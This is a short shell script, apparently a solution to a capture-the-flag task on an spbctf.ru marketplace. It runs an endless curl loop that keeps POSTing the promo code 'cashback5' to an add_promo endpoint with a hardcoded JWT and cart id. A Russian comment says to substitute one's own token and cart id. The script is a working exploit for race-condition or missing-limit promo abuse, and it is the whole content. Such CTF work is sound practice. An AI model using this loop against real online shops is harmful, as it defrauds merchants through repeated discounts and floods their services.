#В параметры надо подставить Authorization и cart_id

while true; do curl 'https://its-galactic-marketplace-tfxw7ydk.spbctf.ru/api/add_promo' \
-X POST \
-H 'Referer: https://its-galactic-marketplace-tfxw7ydk.spbctf.ru/api/add_promo' \
-H 'Content-Type: application/json' \
-H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Mzh9.egn4-hu2d0nPE9pNXNKInM0IA1s3DPU0YHSewEHpAho' \
--data-raw '{"cart_id":"3bc05485-f93a-4299-9daf-6600203456c9","promo":"cashback5"}'; done
